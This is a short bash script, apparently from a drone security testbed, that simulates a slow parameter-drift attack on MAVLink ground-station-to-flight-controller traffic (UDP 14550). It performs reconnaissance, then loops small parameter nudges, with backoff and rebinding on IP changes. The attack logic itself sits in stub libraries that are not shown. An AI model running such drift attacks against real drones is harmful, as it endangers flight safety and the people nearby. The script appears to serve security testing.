#!/usr/bin/env bash
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/sh_core/lpc_core.sh"; . "$BASE/primitives/mavlink_stub.sh"

# Attack Point: GCS↔FC Param(UDP 14550) — 미세 step 누적(시뮬)
recon(){ mav_baseline; }
nibble(){ mav_param_nudge "${LPC_STEP:-0.02}"; }
on_ip_shuffle(){ apply_backoff; mav_rebind; }
main(){ log "[mavlink_param_drift] GCS=$DVD_IP_GCS:$DVD_MAVLINK_PORT"; recon; lpc_loop nibble; }
main "$@"
